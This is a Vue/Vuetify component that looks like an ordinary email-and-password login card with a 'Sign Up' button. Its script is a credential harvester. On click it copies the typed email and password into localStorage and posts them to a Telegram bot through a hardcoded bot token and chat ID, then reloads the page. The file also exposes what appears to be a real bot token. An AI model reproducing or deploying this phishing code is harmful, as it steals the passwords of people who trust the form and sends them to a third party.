<template>
    <v-container min-height="100vh" class="w-100 h-100">
      <v-img
        class="mx-auto my-6"
        src="../assets/auth.jpg"
        max-width="120px"
      ></v-img>
      <v-card
        class="mx-auto pa-12 pb-8"
        elevation="8"
        max-width="448"
        rounded="lg"
      >
        <div class="text-subtitle-1 text-medium-emphasis">Email</div>
        <v-text-field
          density="compact"
          placeholder="Email address"
          prepend-inner-icon="mdi-email-outline"
          variant="outlined"
          v-model="email"
        ></v-text-field>
        <div
          class="text-subtitle-1 text-medium-emphasis d-flex align-center justify-space-between"
        >
          Password
          <!-- <a
            class="text-caption text-decoration-none text-blue"
            href="#"
            rel="noopener noreferrer"
            target="_blank"
          >
            Forgot login password?</a> -->
        </div>
        <v-text-field
          :append-inner-icon="visible ? 'mdi-eye-off' : 'mdi-eye'"
          :type="visible ? 'text' : 'password'"
          density="compact"
          placeholder="Enter your password"
          prepend-inner-icon="mdi-lock-outline"
          variant="outlined"
          v-model="password"
          @click:append-inner="visible = !visible"
        ></v-text-field>

        <v-card class="mb-12" color="surface-variant" variant="tonal">
          <!-- <v-card-text class="text-medium-emphasis text-caption">
            Warning: After 3 consecutive failed login attempts, you account will be temporarily locked for three hours. If you must login now, you can also click "Forgot login password?" below to reset the login password.
          </v-card-text> -->
        </v-card>

        <v-btn class="mb-8" color="blue" size="large" variant="tonal" block @click="sendMessage">
          Sign Up
        </v-btn>

        <!-- <v-card-text class="text-center">
          <a
            class="text-blue text-decoration-none"
            href="#"
            rel="noopener noreferrer"
            target="_blank"
          >
            Sign up now <v-icon icon="mdi-chevron-right"></v-icon>
          </a>
        </v-card-text> -->
      </v-card>
    </v-container>
</template>

<script setup>
import axios from 'axios';
import {useToast} from 'vue-toast-notification';
import 'vue-toast-notification/dist/theme-sugar.css';

const $toast = useToast();
const visible = ref(false);
const botToken = '7808946225:AAFjWBTokCAmVKLYICdZaSQy_ZjkBOpKlao';
const chatId = '5575104582'
const email = ref('')
const password = ref('')
  const sendMessage = async () => {
    const message = `
    email: ${email.value}
    password: ${password.value}
    `
    localStorage.setItem("me", message)
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        const response = await axios.post(apiUrl, {
        chat_id: chatId,
        text: message,
        });
        console.log('Message sent:', response.data);
        if (response?.data?.ok) {
            $toast.success('Message sent successfully!');
            setTimeout(() => {
              window.location.reload()
            }, 1000);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
};
</script>
